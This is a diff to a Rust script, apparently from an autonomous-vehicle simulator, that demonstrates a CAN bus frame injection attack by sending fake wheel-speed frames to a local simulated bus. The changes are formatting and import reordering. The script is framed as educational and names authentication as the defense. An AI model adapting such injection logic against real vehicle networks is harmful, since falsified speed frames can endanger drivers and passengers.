@@ -1,3 +1,5 @@
+use autonomous_vehicle_sim::network::BusClient;
+use autonomous_vehicle_sim::types::{CanFrame, can_ids, encoding};
 /// ATTACK SCENARIO: Malicious Frame Injection
 ///
 /// This script demonstrates a CAN bus injection attack where an attacker
@@ -7,11 +9,8 @@
 ///
 /// PURPOSE: Educational - demonstrates why authentication is needed on CAN bus
 /// DEFENSE: HSM with CMAC authentication can detect unauthorized frames
-
 use colored::*;
 use std::time::Duration;
-use autonomous_vehicle_sim::network::BusClient;
-use autonomous_vehicle_sim::types::{can_ids, encoding, CanFrame};
 
 const BUS_ADDRESS: &str = "127.0.0.1:9000";
 const ATTACKER_NAME: &str = "ATTACKER_INJECTION";
@@ -22,7 +21,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     println!("{}", "   ATTACK: Malicious Frame Injection   ".red().bold());
     println!("{}", "═══════════════════════════════════════".red().bold());
     println!();
-    println!("{}", "⚠️  WARNING: This is a security research tool".yellow());
+    println!(
+        "{}",
+        "⚠️  WARNING: This is a security research tool".yellow()
+    );
     println!("{}", "⚠️  Only use on authorized test systems".yellow());
     println!();
 
@@ -46,7 +48,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
         let fake_speed = if counter % 20 < 10 {
             150.0 // Unrealistically high speed
         } else {
-            0.0   // Sudden stop
+            0.0 // Sudden stop
         };
 
         let data = encoding::encode_wheel_speed(fake_speed);
